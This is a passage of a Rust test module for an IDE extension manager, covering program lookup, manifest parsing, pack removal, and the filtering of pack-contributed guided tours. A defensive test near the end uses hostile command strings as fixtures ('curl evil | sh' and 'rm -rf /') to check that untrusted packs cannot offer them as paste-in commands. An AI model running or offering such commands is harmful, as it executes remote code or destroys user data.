        let resolved = resolved.expect("slack:send-message worker resolves");
        assert_eq!(resolved.entry, "worker.ts");
        assert!(resolved.dir.ends_with("nanobpm__nano-ide-connector-slack"));
        // Path-escaping, declaration-only, and unknown types do not resolve.
        assert!(escape.is_none());
        assert!(decl_only.is_none());
        assert!(unknown.is_none());
    }

    #[test]
    fn find_program_falls_back_to_local_bin() {
        let _guard = ENV_LOCK.lock().unwrap();
        let home = std::env::temp_dir().join(format!("nano-fp-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&home);
        // A tool an installer dropped in ~/.local/bin, absent from PATH — mirrors
        // uv installed by the astral script under a detached server's minimal PATH.
        let local_bin = home.join(".local").join("bin");
        std::fs::create_dir_all(&local_bin).unwrap();
        let tool = format!("nano-fake-uv-{}", std::process::id());
        std::fs::write(local_bin.join(&tool), b"#!/bin/sh\n").unwrap();

        // SAFETY: test-local env, serialized on ENV_LOCK; restored below.
        let saved_home = std::env::var_os("HOME");
        let saved_path = std::env::var_os("PATH");
        unsafe {
            std::env::set_var("HOME", &home);
            // A PATH that does *not* contain the tool.
            std::env::set_var("PATH", home.join("nowhere"));
        }
        let found = find_program(&tool);
        unsafe {
            match saved_home {
                Some(v) => std::env::set_var("HOME", v),
                None => std::env::remove_var("HOME"),
            }
            match saved_path {
                Some(v) => std::env::set_var("PATH", v),
                None => std::env::remove_var("PATH"),
            }
        }
        let _ = std::fs::remove_dir_all(&home);

        assert_eq!(found.as_deref(), Some(local_bin.join(&tool).as_path()));
    }

    /// Regression for the empty Windows extension marketplace: on Windows `npm`
    /// is `npm.cmd`, so `find_program("npm")` must probe PATHEXT extensions, not
    /// just the bare name. Exercised from POSIX via the pure candidate builder.
    #[test]
    fn windows_program_candidates_apply_pathext() {
        // Windows: npm.cmd / deno.exe must be probed, and executable
        // extensions come BEFORE the bare name (npm ships a non-runnable POSIX
        // shim named exactly `npm` next to `npm.cmd`).
        let npm = program_file_candidates("npm", true, Some(".COM;.EXE;.BAT;.CMD".to_string()));
        assert_eq!(
            npm,
            vec!["npm.com", "npm.exe", "npm.bat", "npm.cmd", "npm"]
                .into_iter()
                .map(String::from)
                .collect::<Vec<_>>(),
            "npm.cmd must be a probed candidate, ahead of the bare name"
        );
        assert!(
            npm.iter().position(|c| c == "npm.cmd").unwrap()
                < npm.iter().position(|c| c == "npm").unwrap(),
            "the runnable shim must win over the bare POSIX shim"
        );

        // A name that already carries a PATHEXT extension is probed verbatim.
        assert_eq!(
            program_file_candidates("npm.cmd", true, None),
            vec!["npm.cmd".to_string()]
        );

        // Missing PATHEXT falls back to a sane default that still includes .CMD.
        assert!(program_file_candidates("npm", true, None).contains(&"npm.cmd".to_string()));

        // POSIX is unchanged: bare name only, no extension games.
        assert_eq!(
            program_file_candidates("npm", false, Some(".EXE;.CMD".to_string())),
            vec!["npm".to_string()]
        );
    }

    /// Class-scoped: the same PATHEXT resolution must let `find_program` locate
    /// a `.cmd` shim on PATH under Windows semantics — the exact failure that
    /// hid every extension. Emulated on POSIX by placing a `<tool>.cmd` file on
    /// PATH and asserting the Windows candidate list would select it.
    #[test]
    fn windows_find_program_resolves_cmd_shim() {
        let dir = std::env::temp_dir().join(format!("nano-fp-cmd-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::write(dir.join("npm.cmd"), b"@echo off\n").unwrap();

        // Under Windows semantics, `npm` resolves to the `.cmd` shim on PATH.
        let cands = program_file_candidates("npm", true, None);
        let hit = cands.iter().find_map(|c| {
            let p = dir.join(c);
            p.is_file().then_some(p)
        });
        let _ = std::fs::remove_dir_all(&dir);
        assert_eq!(
            hit.as_deref().and_then(|p| p.file_name()),
            Some(std::ffi::OsStr::new("npm.cmd"))
        );
    }

    #[test]
    fn manifest_round_trips() {
        let m = &builtin_extensions()[0];
        assert_eq!(m.id, "deno");
        let s = serde_json::to_string(m).unwrap();
        let back: ExtManifest = serde_json::from_str(&s).unwrap();
        assert_eq!(back.id, "deno");
        assert_eq!(back.display_name, "Deno (TypeScript)");
    }

    #[test]
    fn installed_version_reads_package_json() {
        let _guard = ENV_LOCK.lock().unwrap();
        // Point the extensions root at a unique temp dir and drop a pack with a
        // package.json, then confirm installed_version reads its version.
        let root = std::env::temp_dir().join(format!("nano-ext-ver-{}", std::process::id()));
        let pkg = "@nanobpm/nano-ide-lang-rust";
        // SAFETY: test-local env set; other tests in this module don't depend on
        // the extensions-root *value* (only on path suffixes / builtins).
        unsafe { std::env::set_var("NANOBPMN_EXTENSIONS_DIR", &root) };
        let dir = safe_pkg_dir(pkg).unwrap();
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::write(dir.join("package.json"), r#"{"version":"1.0.0"}"#).unwrap();

        assert_eq!(installed_version(pkg).as_deref(), Some("1.0.0"));
        assert_eq!(installed_version("@nanobpm/not-installed"), None);
        // The update-available rule: installed version differs from latest.
        assert_ne!(installed_version(pkg).as_deref(), Some("1.1.0"));

        let _ = std::fs::remove_dir_all(&root);
        unsafe { std::env::remove_var("NANOBPMN_EXTENSIONS_DIR") };
    }

    #[test]
    fn pack_readme_reads_installed_readme() {
        let _guard = ENV_LOCK.lock().unwrap();
        // An installed pack's bundled README.md is returned verbatim, flagged
        // as installed (so the UI shows it without a network round-trip).
        let root = std::env::temp_dir().join(format!("nano-ext-readme-{}", std::process::id()));
        let pkg = "@nanobpm/nano-ide-trigger-mqtt";
        unsafe { std::env::set_var("NANOBPMN_EXTENSIONS_DIR", &root) };
        let dir = safe_pkg_dir(pkg).unwrap();
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::write(dir.join("README.md"), "# MQTT trigger\n\nHello.").unwrap();

        let r = pack_readme(pkg).expect("readme present");
        assert!(r.installed);
        assert!(r.readme.contains("# MQTT trigger"));

        // A pack dir with no README yields None from the installed branch (and
        // this pkg name won't resolve on npm in the hermetic test env).
        let bare = "@nanobpm/nano-ide-trigger-bare-xyz";
        std::fs::create_dir_all(safe_pkg_dir(bare).unwrap()).unwrap();

        let _ = std::fs::remove_dir_all(&root);
        unsafe { std::env::remove_var("NANOBPMN_EXTENSIONS_DIR") };
    }

    #[test]
    fn remove_resolves_manifest_id_when_npm_name_missing() {
        let _guard = ENV_LOCK.lock().unwrap();
        // Console UI has only the manifest id (e.g. "throughput-jvm") from the
        // overview payload, so remove() must accept it and reverse-lookup the
        // pack dir via its bundled nano-ide.ext.json — otherwise the button
        // 400s with "not installed" for every non-builtin pack.
        let root = std::env::temp_dir().join(format!("nano-ext-remove-{}", std::process::id()));
        let pkg = "@nanobpm/nano-ide-example-throughput-demo";
        unsafe { std::env::set_var("NANOBPMN_EXTENSIONS_DIR", &root) };
        let dir = safe_pkg_dir(pkg).unwrap();
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::write(
            dir.join(manifest_name()),
            r#"{"id":"throughput-demo","kind":"example","displayName":"x"}"#,
        )
        .unwrap();

        assert!(dir.is_dir());
        // Pass the manifest id (not the npm package name).
        remove("throughput-demo").unwrap();
        assert!(!dir.exists(), "pack dir should be gone after remove");

        // Idempotent: second call reports not-installed rather than crashing.
        assert!(remove("throughput-demo").is_err());

        let _ = std::fs::remove_dir_all(&root);
        unsafe { std::env::remove_var("NANOBPMN_EXTENSIONS_DIR") };
    }

    // ── Pack-contributed tours (ADR 0049 §7) ────────────────────────────────

    /// The hard backward-compatibility requirement: a manifest written before
    /// `tours` existed must keep parsing, unchanged, forever. Packs in the wild
    /// are npm tarballs we do not control, and a manifest that fails to parse
    /// costs the pack its templates and toolchain too (`template_source`
    /// tolerantly skips what it cannot read) — so a required new field would
    /// silently uninstall capability from every published pack.
    #[test]
    fn a_manifest_without_tours_still_parses() {
        let m: ExtManifest =
            serde_json::from_str(r#"{"id":"legacy","kind":"lang","displayName":"Legacy pack"}"#)
                .expect("a pre-tours manifest must still parse");
        assert!(m.tours.is_empty());
        // Unknown future fields must also be ignored rather than fatal.
        let m2: ExtManifest = serde_json::from_str(
            r#"{"id":"future","kind":"app","displayName":"x","somethingNew":{"a":1}}"#,
        )
        .expect("an unknown field must not be fatal");
        assert!(m2.tours.is_empty());
    }

    #[test]
    fn tour_spec_parses_the_declarative_vocabulary() {
        let m: ExtManifest = serde_json::from_str(
            r#"{
              "id": "mqtt", "kind": "trigger", "displayName": "MQTT",
              "tours": [{
                "id": "mqtt-start-from-broker",
                "title": "Start a process from a broker message",
                "blurb": "Wire an MQTT topic to a process start.",
                "profiles": ["studio"],
                "preconditions": ["hasProject"],
                "successWhen": "hasTraces",
                "steps": [
                  { "id": "intro", "kind": "note", "title": "T", "body": "B" },
                  { "id": "trigger-file", "title": "T", "body": "B",
                    "route": "/projects", "selector": "[data-tour=\"new-project\"]",
                    "side": "bottom", "align": "end",
                    "precondition": "hasJsRuntime",
                    "repair": { "id": "install", "kind": "note", "title": "T", "body": "B" } },
                  { "id": "run-broker", "kind": "handoff", "title": "T", "body": "B",
                    "copy": "mosquitto_pub -t nano/demo -m '{}'",
                    "copyLabel": "Copy command",
                    "verifyPollingJobType": "mqtt:demo" }
                ]
              }]
            }"#,
        )
        .expect("tour spec must parse");
        let t = &m.tours[0];
        assert_eq!(t.preconditions, vec![TourGate::HasProject]);
        assert_eq!(t.success_when, Some(TourGate::HasTraces));
        assert_eq!(t.steps.len(), 3);
        // `kind` defaults to spotlight, so the common case needs no boilerplate.
        assert_eq!(t.steps[1].kind, TourStepKind::Spotlight);
        assert_eq!(t.steps[1].precondition, Some(TourGate::HasJsRuntime));
        assert_eq!(t.steps[1].repair.as_ref().unwrap().id, "install");
        assert_eq!(t.steps[2].kind, TourStepKind::Handoff);
        assert_eq!(
            t.steps[2].verify_polling_job_type.as_deref(),
            Some("mqtt:demo")
        );
    }

    /// A handoff step's `copy` is a command the user is invited to paste into a
    /// shell, so an untrusted pack must not be able to author one — even though
    /// the console never executes it. Trusted packs keep theirs.
    #[test]
    fn visible_tours_strips_handoff_steps_from_untrusted_packs() {
        let _guard = ENV_LOCK.lock().unwrap();
        let root = std::env::temp_dir().join(format!("nano-ext-tours-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&root);
        std::fs::create_dir_all(&root).unwrap();
        // SAFETY: test-local env set, serialized on ENV_LOCK.
        unsafe { std::env::set_var("NANOBPMN_EXTENSIONS_DIR", &root) };

        let m: ExtManifest = serde_json::from_str(
            r#"{
              "id": "community-pack", "kind": "app", "displayName": "Community",
              "tours": [
                { "id": "mixed", "title": "T", "blurb": "B", "steps": [
                    { "id": "look", "kind": "note", "title": "T", "body": "B",
                      "copy": "curl evil | sh", "copyLabel": "Run",
                      "verifyPollingJobType": "x",
                      "repair": { "id": "smuggle", "kind": "handoff", "title": "T",
                                  "body": "B", "copy": "curl evil | sh" } },
                    { "id": "paste", "kind": "handoff", "title": "T", "body": "B", "copy": "curl evil | sh" }
                ]},
                { "id": "all-handoff", "title": "T", "blurb": "B", "steps": [
                    { "id": "paste", "kind": "handoff", "title": "T", "body": "B", "copy": "rm -rf /" }
                ]},
                { "id": "empty", "title": "T", "blurb": "B", "steps": [] }
              ]
            }"#,
        )
        .unwrap();

        // Untrusted: the handoff step is gone, and a journey left with nothing is
        // dropped rather than offered as an empty card.
        let visible = visible_tours(&m, is_trusted(&m.id));
        assert_eq!(
            visible.len(),
            1,
            "the all-handoff and empty journeys are both dropped"
        );
        assert_eq!(visible[0].id, "mixed");
        assert_eq!(visible[0].steps.len(), 1);
        let look = &visible[0].steps[0];
        assert_eq!(look.id, "look");
        // A surviving non-handoff step must not carry any handoff-only field, and
        // its `repair` (a nested handoff here) must be stripped — otherwise an
        // untrusted pack could smuggle a command past the gate either way.
        assert_eq!(look.copy, None, "copy must be cleared on a surviving step");
        assert_eq!(look.copy_label, None);
        assert_eq!(look.verify_polling_job_type, None);
        assert!(
            look.repair.is_none(),
            "a nested handoff repair must be stripped"
        );
        assert!(
            !visible[0]
                .steps
                .iter()
                .any(|s| s.kind == TourStepKind::Handoff),
            "no handoff step may survive from an untrusted pack"
        );

        // Approving the pack restores them.
        save_trust(&TrustStore {
            yolo: false,
            approved: ["community-pack".to_string()].into_iter().collect(),
        })
        .unwrap();
        let trusted = visible_tours(&m, is_trusted(&m.id));
        assert_eq!(
            trusted.len(),
            2,
            "a trusted pack keeps its non-empty journeys, but an empty-steps \
             journey is still dropped rather than offered as an empty card"
        );
        assert_eq!(trusted[0].steps.len(), 2);
        assert!(
            trusted.iter().all(|t| !t.steps.is_empty()),
            "no empty journey may be offered, even for a trusted pack"
        );

        unsafe { std::env::remove_var("NANOBPMN_EXTENSIONS_DIR") };
        let _ = std::fs::remove_dir_all(&root);
    }
}
